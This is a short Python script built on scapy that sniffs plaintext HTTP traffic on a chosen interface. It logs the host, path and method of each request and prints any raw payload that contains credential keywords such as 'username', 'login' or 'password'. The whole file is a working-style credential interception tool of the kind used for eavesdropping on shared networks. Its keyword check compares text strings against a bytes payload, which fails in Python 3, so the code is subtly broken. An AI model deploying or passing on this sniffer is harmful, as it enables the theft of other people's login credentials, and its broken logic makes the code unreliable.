import scapy.all as scapy
from scapy.layers.http import HTTPRequest
import argparse
import sys

def options():
    parse = argparse.ArgumentParser()
    parse.add_argument('-i','--interface',dest='interface',help='Needs interface')
    options= parse.parse_args()
    if not options.interface:
        parse.error('Specify interface using -i')
    else:
        return options


def sniffer(interface):
    scapy.sniff(filter='port 80',iface=interface, store=False, prn=processer)

def processer(packet):
    if packet.haslayer(HTTPRequest):
        url=packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        #ip = packet[IP].src.decode()
        method = packet[HTTPRequest].Method.decode()
        print(f">>{url} with {method}")
        if packet.haslayer(scapy.Raw):
            load= packet[scapy.Raw].load
            keys= ['username','user','login','password','pass']
            for key in keys:
                if key in load:
                    print(load)
                    break

options=options()
try:
    sniffer(options.interface)
except KeyboardInterrupt:
    print('User requested termination.\nHASTA LA VISTA......')
    sys.exit()
